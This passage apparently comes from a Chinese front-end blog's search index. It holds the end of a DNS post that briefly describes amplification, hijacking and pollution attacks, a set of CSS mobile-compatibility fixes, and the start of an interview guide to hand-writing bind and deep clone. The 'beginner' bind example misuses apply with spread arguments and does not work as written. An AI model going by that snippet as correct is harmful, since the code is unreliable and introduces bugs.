src="https://cdn.nlark.com/yuque/0/2020/png/164572/1589512622044-d53a60f9-2bba-4672-b3ad-3581fbb188d8.png#height=806&id=LY0qf&originHeight=806&originWidth=1280&originalType=binary&ratio=1&rotation=0&showTitle=false&size=791656&status=done&style=none&title=&width=1280" class="lazyload placeholder" data-srcset="https://cdn.nlark.com/yuque/0/2020/png/164572/1589512622044-d53a60f9-2bba-4672-b3ad-3581fbb188d8.png#height=806&id=LY0qf&originHeight=806&originWidth=1280&originalType=binary&ratio=1&rotation=0&showTitle=false&size=791656&status=done&style=none&title=&width=1280" srcset="https://maiwoqiche-1251117131.cos.ap-shanghai.myqcloud.com/internationalStation/loading.gif" alt="image.png"></p><p><a name="vcpIP"></a></p><h2 id="DNS安全问题"><a href="#DNS安全问题" class="headerlink" title="DNS安全问题"></a>DNS安全问题</h2><ol><li>DNS反射&#x2F;放大攻击<br />向大量开放DNS服务器发送大范围域名查询的DNS请求，并将该DNS请求的源IP地址伪造成想要攻击的目标IP地址。由于请求数据比相应数据小得多，攻击者可以利用该技术放大掌握的带宽资源和攻击流量。</li><li>DDOS攻击可能造成域名解析瘫痪</li><li>DNS&#x2F;域名劫持<br />在劫持的网络范围内拦截域名解析的请求，分析请求的域名，返回假的IP地址或者使请求失去响应。DNS劫持通过篡改DNS服务器上的数据返回给用户一个错误的查询结果来实现的。</li><li>DNS污染<br />DNS污染是一种让一般用户由于得到虚假目标主机IP而不能与其通信的方法，指的是用户访问一个地址，国内的服务器(非DNS)监控到用户访问的已经被标记地址时，服务器伪装成DNS服务器向用户发回错误的地址的行为。<br />dns污染与dns劫持的区别在于，dns劫持修改了dns的解析结果，dns污染是不经过dns服务器，返回错误信息</li><li>DNS信息黑客被修改</li></ol><p><a name="tX5Ik"></a></p><h2 id="DNS优化"><a href="#DNS优化" class="headerlink" title="DNS优化"></a>DNS优化</h2><p>可以看出，dns解析是一个漫长的过程，如何优化这一过程呢？</p><ol><li>DNS Prefetching用户在请求某个链接之前，浏览器先尝试解析该链接的域名再将其进行缓存。这样真正请求的时候就不需要进行DNS解析。可以<ul><li>在服务器中响应设置<code>X-DNS-Prefetch-Control</code>的值为<code>on</code>启动预解析</li><li>HTML中，<code>&lt;meta http-equiv=&quot;x-dns-prefetch-control&quot; content=&quot;on&quot;&gt;</code></li><li>对特定域名预解析<code>&lt;link rel=”dns-prefetch” href=”//fonts.googleapis.com”&gt;</code></li></ul></li><li>域名收敛<br />建议将静态资源只放在一个域名下面，可以有效减少dns的请求</li><li>httpdns基于Http协议向HTTPDNS服务器发送域名解析请求，替代了基于DNS协议向运营商Local DNS发起解析请求的传统方式，可以避免运营商的域名劫持和进行精准调度。这过程分为两步<ol><li>客户端直接访问HttpDNS接口，获取业务在域名配置管理系统上配置的访问延迟最优的IP。（基于容灾考虑，还是保留次选使用运营商LocalDNS解析域名的方式）</li><li>客户端向获取到的IP后就向直接往此IP发送业务协议请求。以Http请求为例，通过在header中指定host字段，向HttpDNS返回的IP发送标准的Http请求即可。</li></ol></li></ol><p><a name="thwCN"></a></p><h2 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h2><p>「真®全栈之路 - DNS篇」故事从输入URL开始….：<a href="https://juejin.im/post/5ceebb7251882507266414b7#heading-10">https://juejin.im/post/5ceebb7251882507266414b7#heading-10</a></p>]]></content>
      
      
      <categories>
          
          <category> 前端 </category>
          
          <category> 浏览器 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 浏览器 </tag>
            
            <tag> 面试 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>css常见兼容问题</title>
      <link href="/2020/07/28/compatible/css-compatible/"/>
      <url>/2020/07/28/compatible/css-compatible/</url>
      
        <content type="html"><![CDATA[<meta name="referrer" content="no-referrer" /><h4 id="移动端的-1px"><a href="#移动端的-1px" class="headerlink" title="移动端的 1px"></a>移动端的 1px</h4><p>问题描述：1px 的边框。在高清屏下，移动端的 1px 会很粗。<br />产生原因：首先先要了解一个概念：<strong>DPR(devicePixelRatio) 设备像素比</strong>，它是默认缩放为 100%的情况下，设备像素和 CSS 逻辑像素的比值。目前主流的屏幕 DPR&#x3D;2 或者 3。CSS中设置的px是逻辑像素,这就造成1px变成物理像素的2px或者3px，比如2 倍屏，设备的物理像素要实现 1 像素，所以 CSS 逻辑像素只能是 0.5px。<br />下面介绍最常用的方法<br />通过CSS :before 选择器或CSS :after 选择器设置height:1px，同时缩放0.5倍实现。</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* 底边框 */</span></span><br><span class="line"><span class="selector-class">.b-border</span> &#123;</span><br><span class="line">  <span class="attribute">position</span>: relative;</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-class">.b-border</span><span class="selector-pseudo">:before</span> &#123;</span><br><span class="line">  <span class="attribute">content</span>: <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">  <span class="attribute">position</span>: absolute;</span><br><span class="line">  <span class="attribute">left</span>: <span class="number">0</span>;</span><br><span class="line">  <span class="attribute">bottom</span>: <span class="number">0</span>;</span><br><span class="line">  <span class="attribute">width</span>: <span class="number">100%</span>;</span><br><span class="line">  <span class="attribute">height</span>: <span class="number">1px</span>;</span><br><span class="line">  <span class="attribute">background</span>: <span class="number">#d9d9d9</span>;</span><br><span class="line">  -webkit-<span class="attribute">transform</span>: <span class="built_in">scaleY</span>(<span class="number">0.5</span>);</span><br><span class="line">  <span class="attribute">transform</span>: <span class="built_in">scaleY</span>(<span class="number">0.5</span>);</span><br><span class="line">  -webkit-<span class="attribute">transform-origin</span>: <span class="number">0</span> <span class="number">0</span>;</span><br><span class="line">  <span class="attribute">transform-origin</span>: <span class="number">0</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 四条边 */</span></span><br><span class="line"><span class="selector-class">.setBorderAll</span> &#123;</span><br><span class="line">  <span class="attribute">position</span>: relative;</span><br><span class="line">  &amp;<span class="selector-pseudo">:after</span> &#123;</span><br><span class="line">    <span class="attribute">content</span>: <span class="string">&#x27; &#x27;</span>;</span><br><span class="line">    <span class="attribute">position</span>: absolute;</span><br><span class="line">    <span class="attribute">top</span>: <span class="number">0</span>;</span><br><span class="line">    <span class="attribute">left</span>: <span class="number">0</span>;</span><br><span class="line">    <span class="attribute">width</span>: <span class="number">200%</span>;</span><br><span class="line">    <span class="attribute">height</span>: <span class="number">200%</span>;</span><br><span class="line">    <span class="attribute">transform</span>: <span class="built_in">scale</span>(<span class="number">0.5</span>);</span><br><span class="line">    <span class="attribute">transform-origin</span>: left top;</span><br><span class="line">    <span class="attribute">box-sizing</span>: border-box;</span><br><span class="line">    <span class="attribute">border</span>: <span class="number">1px</span> solid <span class="number">#e5e5e5</span>;</span><br><span class="line">    <span class="attribute">border-radius</span>: <span class="number">4px</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><a name="KO4Ca"></a></p><h4 id="CSS动画页面闪白-动画卡顿"><a href="#CSS动画页面闪白-动画卡顿" class="headerlink" title="CSS动画页面闪白,动画卡顿"></a>CSS动画页面闪白,动画卡顿</h4><p>问题描述：CSS动画页面闪白,动画卡顿<br />解决方法: <br />1.尽可能地使用合成属性transform和opacity来设计CSS3动画，不使用position的left和top来定位 <br />2.开启硬件加速</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">-webkit-<span class="attribute">transform</span>: <span class="built_in">translate3d</span>(<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">-moz-<span class="attribute">transform</span>: <span class="built_in">translate3d</span>(<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">-ms-<span class="attribute">transform</span>: <span class="built_in">translate3d</span>(<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line"><span class="attribute">transform</span>: <span class="built_in">translate3d</span>(<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>);</span><br></pre></td></tr></table></figure><p><a name="cvaLi"></a></p><h4 id="屏蔽用户选择"><a href="#屏蔽用户选择" class="headerlink" title="屏蔽用户选择"></a>屏蔽用户选择</h4><p>禁止用户选择页面中的文字或者图片</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">div</span> &#123;</span><br><span class="line">  -webkit-touch-callout: none;</span><br><span class="line">  -webkit-user-select: none;</span><br><span class="line">  -khtml-user-select: none;</span><br><span class="line">  -moz-user-select: none;</span><br><span class="line">  -ms-user-select: none;</span><br><span class="line">  user-select: none;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><a name="IzfcU"></a></p><h4 id="清除输入框内阴影"><a href="#清除输入框内阴影" class="headerlink" title="清除输入框内阴影"></a>清除输入框内阴影</h4><p>问题描述：在 iOS 上，输入框默认有内部阴影 解决方式：</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">input</span> &#123;</span><br><span class="line">  -webkit-appearance: none;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><a name="GBwTM"></a></p><h4 id="禁止保存或拷贝图像"><a href="#禁止保存或拷贝图像" class="headerlink" title="禁止保存或拷贝图像"></a>禁止保存或拷贝图像</h4><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">img</span> &#123;</span><br><span class="line">  -webkit-touch-callout: none;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><a name="o7i6z"></a></p><h4 id="输入框默认字体颜色设置"><a href="#输入框默认字体颜色设置" class="headerlink" title="输入框默认字体颜色设置"></a>输入框默认字体颜色设置</h4><p>设置 input 里面 placeholder 字体的颜色</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">input</span>::-webkit-input-placeholder,</span><br><span class="line">textarea::-webkit-input-placeholder &#123;</span><br><span class="line">  <span class="attribute">color</span>: <span class="number">#c7c7c7</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-tag">input</span>:-moz-placeholder,</span><br><span class="line">textarea:-moz-placeholder &#123;</span><br><span class="line">  <span class="attribute">color</span>: <span class="number">#c7c7c7</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-tag">input</span>:-ms-input-placeholder,</span><br><span class="line">textarea:-ms-input-placeholder &#123;</span><br><span class="line">  <span class="attribute">color</span>: <span class="number">#c7c7c7</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><a name="b54E7"></a></p><h4 id="用户设置字号放大或者缩小导致页面布局错误"><a href="#用户设置字号放大或者缩小导致页面布局错误" class="headerlink" title="用户设置字号放大或者缩小导致页面布局错误"></a>用户设置字号放大或者缩小导致页面布局错误</h4><p>设置字体禁止缩放</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">body</span> &#123;</span><br><span class="line">  -webkit-text-size-adjust: <span class="number">100%</span> <span class="meta">!important</span>;</span><br><span class="line">  text-size-adjust: <span class="number">100%</span> <span class="meta">!important</span>;</span><br><span class="line">  -moz-text-size-adjust: <span class="number">100%</span> <span class="meta">!important</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><a name="QmFWH"></a></p><h4 id="android系统中元素被点击时产生边框"><a href="#android系统中元素被点击时产生边框" class="headerlink" title="android系统中元素被点击时产生边框"></a>android系统中元素被点击时产生边框</h4><p>部分android系统点击一个链接，会出现一个边框或者半透明灰色遮罩, 不同生产商定义出来额效果不一样。去除代码如下</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">a</span>,<span class="selector-tag">button</span>,<span class="selector-tag">input</span>,<span class="selector-tag">textarea</span>&#123;</span><br><span class="line">  -webkit-tap-highlight-<span class="attribute">color</span>: <span class="built_in">rgba</span>(<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>)</span><br><span class="line">  -webkit-user-modify:read-write-plaintext-only; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><a name="OVd7J"></a></p><h4 id="iOS-滑动不流畅"><a href="#iOS-滑动不流畅" class="headerlink" title="iOS 滑动不流畅"></a>iOS 滑动不流畅</h4><p>ios 手机上下滑动页面会产生卡顿，手指离开页面，页面立即停止运动。整体表现就是滑动不流畅，没有滑动惯性。 iOS 5.0 以及之后的版本，滑动有定义有两个值 auto 和 touch，默认值为 auto。</p><ul><li>解决方式</li></ul><p>1.在滚动容器上增加滚动 touch 方法</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-class">.wrapper</span> &#123;</span><br><span class="line">  -webkit-<span class="attribute">overflow</span>-scrolling: touch;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p> 2.设置 overflow 设置外部 overflow 为 hidden,设置内容元素 overflow 为 auto。内部元素超出 body 即产生滚动，超出的部分 body 隐藏。</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">body</span> &#123;</span><br><span class="line">  <span class="attribute">overflow-y</span>: hidden;</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-class">.wrapper</span> &#123;</span><br><span class="line">  <span class="attribute">overflow-y</span>: auto;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 前端 </category>
          
          <category> css </category>
          
      </categories>
      
      
        <tags>
            
            <tag> css </tag>
            
            <tag> compatible </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>前端四大手写</title>
      <link href="/2020/07/23/frontend/interview/qian-duan-si-da-shou-xie/"/>
      <url>/2020/07/23/frontend/interview/qian-duan-si-da-shou-xie/</url>
      
        <content type="html"><![CDATA[<meta name="referrer" content="no-referrer" /><p>要问程序员最心虚的面试题，如果要投票选择，<strong>手撕代码</strong>一定是前三位的。其中在前端领域，以<strong>手写 bind</strong>、<strong>手写深拷贝</strong>、<strong>手写 EventHub</strong>（发布-订阅）、<strong>手写 Promise</strong>最为常见，我将他们称为<strong>四大手写。</strong>本文的目的就是要破除大家对四大手写的恐惧，将从<strong>为什么要会手写</strong>，到每个手写的<strong>关键思路总结</strong>，再到<strong>最终模板</strong>，我都会<strong>毫无保留</strong>地分享给大家。话不多说，让我们开始吧。<br><a name="VqL5S"></a></p><h2 id="为什么要会手写"><a href="#为什么要会手写" class="headerlink" title="为什么要会手写"></a>为什么要会手写</h2><p>面试遇到手写题一脸懵逼的你也许一定想问：网上代码一堆，随便抄一下不香吗，为什么要手写？关于这个问题最直接的回答：为了<strong>区分</strong>厉害的和普通的。但坦白来讲，<strong>会白板实现关键功能的人，实现业务需求的效率一定更高</strong>。<br />为什么这么说？<br />拿手写 Promise 举例来讲，真实的业务场景会遇到大量的 AJAX 异步请求，而且大多是嵌套多层的异步代码。<br />普通前端 A 平时只会最简单的 Promise 用法，遇到多层嵌套的 Promise 就搞不清楚逻辑了，于是开发 1 小时，修 Bug 3 小时，<strong>内卷 996</strong>；<br />高级前端 B 会手写 Promise，对 Promise 的内在逻辑一清二楚，于是开发半小时，修 Bug 15 分钟，完成质量高速度快，深受 PM 小姐姐和测试小哥哥的喜爱，<strong>准点下班绩效高</strong>。<br />再举个 EventHub 的例子，会手写 EventHub 的前端，Vue 里的 $emit、$on 基本就是闭眼写；同理还有 React 里面组件想要调用普通函数（非箭头函数），需要 this.fn.bind(this)，会手写 bind 的前端就更容易举一反三，不会的就只能死记硬背，遇到 Bug 不知所措。。。<br />所以，会“四大手写”是<strong>前端进阶</strong>的必由之路，甚至可以说，<strong>手写关键代码的能力 ≈ 编程能力</strong>。</p><hr><p><a name="sODCV"></a></p><h2 id="手写-bind"><a href="#手写-bind" class="headerlink" title="手写 bind"></a>手写 bind</h2><p>bind 用法不难，一句话解释就是把新的 this 绑定到某个函数 func 上，并返回 func 的一个拷贝。使用方法如下：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> boundFunc = func.<span class="title function_">bind</span>(thisArg[, arg1[, arg2[, ...argN]]])</span><br></pre></td></tr></table></figure><p><br />那怎么实现呢？我认为手写 bind 可以分为三个境界：</p><ol><li>初级：只用 ES6 新语法</li></ol><ul><li>优点：因为可以使用 const 、… 操作符，代码简洁</li><li>缺点：兼容性稍差</li></ul><ol start="2"><li>中级：使用 ES5 语法</li></ol><ul><li>优点：兼容 IE（其实可以忽略）</li><li>缺点：参数要用Array.prototype.slice 获取，复杂且不支持 new</li></ul><ol start="3"><li>高级：ES5 + 支持 new</li></ol><ul><li>优点：支持 new</li><li>缺点：最复杂</li></ul><p><a name="P5uSV"></a></p><h3 id="初级-bind"><a href="#初级-bind" class="headerlink" title="初级 bind"></a>初级 bind</h3><p>这种方式的优点是因为可以使用 const 、… 操作符，代码简洁；缺点是不兼容 IE 等一些古老浏览器</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 初级：ES6 新语法 const/...</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">bind_1</span>(<span class="params">asThis, ...args</span>) &#123;</span><br><span class="line">  <span class="keyword">const</span> fn = <span class="variable language_">this</span>; <span class="comment">// 这里的 this 就是调用 bind 的函数 func</span></span><br><span class="line">  <span class="keyword">return</span> <span class="keyword">function</span> (<span class="params">...args2</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> fn.<span class="title function_">apply</span>(asThis, ...args, ...args2);</span><br><span class="line">  &#125;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><a name="mivQ4"></a></p><h3 id="中级-bind"><a href="#中级-bind" class="headerlink" title="中级 bind"></a>中级 bind</h3><ul><li>优点：兼容 IE</li><li>缺点：参数要用Array.prototype.slice 取，复杂且不支持 new</li></ul><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 中级：兼容 ES5</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">bind_2</span>(<span class="params">asThis</span>) &#123;</span><br><span class="line">  <span class="keyword">var</span> slice = <span class="title class_">Array</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">slice</span>;</span><br><span class="line">  <span class="keyword">var</span> args = slice.<span class="title function_">call</span>(<span class="variable language_">arguments</span>, <span class="number">1</span>);</span><br><span class="line">  <span class="keyword">var</span> fn = <span class="variable language_">this</span>;</span><br><span class="line">  <span class="keyword">if</span> (<span class="keyword">typeof</span> fn !== <span class="string">&quot;function&quot;</span>) &#123;</span><br><span class="line">    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">Error</span>(<span class="string">&quot;cannot bind non_function&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">var</span> args2 = slice.<span class="title function_">call</span>(<span class="variable language_">arguments</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">return</span> fn.<span class="title function_">apply</span>(asThis, args.<span class="title function_">concat</span>(args2));</span><br><span class="line">  &#125;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><a name="Vig5y"></a></p><h3 id="高级-bind"><a href="#高级-bind" class="headerlink" title="高级 bind"></a>高级 bind</h3><ul><li>优点：支持 new</li><li>缺点：最复杂</li></ul><p>写之前，我们先来看一看我们应该如何判断 new，</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">new</span> <span class="title function_">fn</span>(args)</span><br></pre></td></tr></table></figure><p> 其实<strong>等价于</strong>：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> temp = &#123;&#125;</span><br><span class="line">temp.<span class="property">__proto__</span> = fn.<span class="property"><span class="keyword">prototype</span></span></span><br><span class="line">fn.<span class="title function_">apply</span>(temp, [...args])</span><br><span class="line"><span class="keyword">return</span> temp</span><br></pre></td></tr></table></figure><p>核心在第二句：temp.<strong>proto</strong> &#x3D; fn.prototype，有了这个，我们便知道可以用 fn.prototype 是否为对象原型来判断是否为 new 的情况。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 高级：支持 new，例如 new (funcA.bind(thisArg, args))</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">bind_3</span>(<span class="params">asThis</span>) &#123;</span><br><span class="line">  <span class="keyword">var</span> slice = <span class="title class_">Array</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">slice</span>;</span><br><span class="line">  <span class="comment">// 改变数组slice方法的作用域，使 this 指向arguments对象</span></span><br><span class="line">  <span class="comment">// call () 方法的第二个参数表示传递给slice的参数即截取数组的起始位置</span></span><br><span class="line">  <span class="keyword">var</span> args1 = slice.<span class="title function_">call</span>(<span class="variable language_">arguments</span>, <span class="number">1</span>);</span><br><span class="line">  <span class="keyword">var</span> fn = <span class="variable language_">this</span>;</span><br><span class="line">  <span class="keyword">if</span> (<span class="keyword">typeof</span> fn !== <span class="string">&quot;function&quot;</span>) &#123;</span><br><span class="line">    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">Error</span>(<span class="string">&quot;Must accept function&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">function</span> <span class="title function_">resultFn</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">var</span> args2 = slice.<span class="title function_">call</span>(<span class="variable language_">arguments</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">return</span> fn.<span class="title function_">apply</span>(</span><br><span class="line">      resultFn.<span class="property"><span class="keyword">prototype</span></span>.<span class="title function_">isPrototypeOf</span>(<span class="variable language_">this</span>) ? <span class="variable language_">this</span> : asThis, <span class="comment">// 用来绑定 this</span></span><br><span class="line">      args1.<span class="title function_">concat</span>(args2)</span><br><span class="line">    );</span><br><span class="line">  &#125;</span><br><span class="line">  resultFn.<span class="property"><span class="keyword">prototype</span></span> = fn.<span class="property"><span class="keyword">prototype</span></span>;</span><br><span class="line">  <span class="keyword">return</span> resultFn;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>接下来是前端年年考，年年不会，网上博客又经常误人子弟的“手写深拷贝”。</p><hr><p><a name="vuhlj"></a></p><h2 id="手写深拷贝"><a href="#手写深拷贝" class="headerlink" title="手写深拷贝"></a>手写深拷贝</h2><p>先问这么几个问题，</p><ul><li>首先为什么要深拷贝？不希望数据被修改或者只需要部分修改数据。</li><li>怎么实现深拷贝？简单需求用 JSON 反序列化，复杂需求用递归克隆。</li><li>手写深拷贝的优点？体现扎实的 JS 基础。</li><li>至于缺点以及如何解决稍后再回答<br><a name="IQGQm"></a></li></ul><h3 id="简单需求"><a href="#简单需求" class="headerlink" title="简单需求"></a>简单需求</h3><p>最简单的手写深拷贝就一行，通过 <strong>JSON 反序列化</strong>来实现</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> B = <span class="title class_">JSON</span>.<span class="title function_">parse</span>(<span class="title class_">JSON</span>.<span class="title function_">stringify</span>(A))</span><br></pre></td></tr></table></figure><p>缺点也是显而易见的，<strong>JSON value不支持的数据类型，都拷贝不了</strong></p><ol><li>不支持函数</li><li>不支持undefined（<strong>支持null</strong>）</li><li>不支持循环引用，比如 a &#x3D; {name: ‘a’}; a.self &#x3D; a; a2 &#x3D; JSON.parse(JSON.stringify(a))</li><li>不支持Date，会变成 ISO8601 格式的字符串</li><li>不支持正则表达式</li><li>不支持Symbol</li></ol><p>如何支持这些复杂需求，就需要用到<strong>递归克隆</strong>了。<br><a name="LTgyG"></a></p><h3 id="复杂需求"><a href="#复杂需求" class="headerlink" title="复杂需求"></a>复杂需求</h3><p><strong>核心</strong>有三点：</p><ol><li>递归</li><li>对象分类型讨论</li><li>解决循环引用（环）</li></ol><p>下面给出我的模板：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 深拷贝</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">DeepClone</span> &#123;</span><br><span class="line">  <span class="title function_">constructor</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">cacheList</span> = [];</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="title function_">clone</span>(<span class="params">source</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> (source <span class="keyword">instanceof</span> <span class="title class_">Object</span>) &#123;</span><br><span class="line">      <span class="keyword">const</span> cache = <span class="variable language_">this</span>.<span class="title function_">findCache</span>(source);</span><br><span class="line">      <span class="keyword">if</span> (cache) <span class="keyword">return</span> cache; <span class="comment">// 如果找到缓存，直接返回</span></span><br><span class="line">      <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">let</span> target;</span><br><span class="line">        <span class="keyword">if</span> (source <span class="keyword">instanceof</span> <span class="title class_">Array</span>) &#123;</span><br><span class="line">          target = <span class="keyword">new</span> <span class="title class_">Array</span>();</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (source <span class="keyword">instanceof</span> <span class="title class_">Function</span>) &#123;</span><br><span class="line">          target = <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> source.<span class="title function_">apply</span>(<span class="variable language_">this</span>, <span class="variable language_">arguments</span>);</span><br><span class="line">          &#125;;</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (source <span class="keyword">instanceof</span> <span class="title class_">Date</span>) &#123;</span><br><span class="line">          